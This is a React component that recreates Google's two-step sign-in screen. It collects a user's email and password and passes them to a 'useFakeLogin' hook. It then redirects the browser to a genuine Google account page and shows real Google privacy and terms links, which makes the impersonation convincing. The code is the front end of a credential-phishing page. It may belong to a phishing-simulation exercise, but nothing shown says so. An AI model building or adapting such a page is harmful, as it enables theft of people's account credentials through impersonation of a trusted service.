import { useState } from "react";
import First from "./first";
import Second from "./second";
import { useFakeLogin } from "../use-fake-login";

//the UI is ai generated to gain time
const Google = () => {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const login = useFakeLogin();
  const handleFirstNext = () => {
    setStep(2);
  };
  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setEmail(e.target.value);
  };
  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPassword(e.target.value);
  };
  const handleSecondBack = () => {
    setStep(1);
  };

  const handleSecondNext = async () => {
    await login({ login: email, password });
    globalThis.location.href = "https://www.google.com/account/about/?hl=fr";
  };

  return (
    <div className="min-h-screen w-full flex flex-col items-center justify-center bg-[#f0f2f5] px-4">
      <div className="w-full flex-1 flex flex-col items-center justify-center">
        {step === 1 ? (
          <First
            onNext={handleFirstNext}
            onEmailChange={handleEmailChange}
            email={email}
          />
        ) : (
          <Second
            email={email}
            onBack={handleSecondBack}
            onPasswordChange={handlePasswordChange}
            password={password}
            onPasswordSubmit={handleSecondNext}
          />
        )}
      </div>

      <div className="w-full max-w-[448px] mx-auto py-6 flex justify-between items-center text-xs text-gray-600">
        <div className="cursor-pointer hover:bg-gray-200 px-2 py-1 rounded">
          English (United States)
        </div>
        <div className="flex gap-6">
          <a
            href="https://policies.google.com/privacy"
            className="hover:text-gray-800"
          >
            Privacy
          </a>
          <a
            href="https://policies.google.com/terms"
            className="hover:text-gray-800"
          >
            Terms
          </a>
        </div>
      </div>
    </div>
  );
};

export default Google;
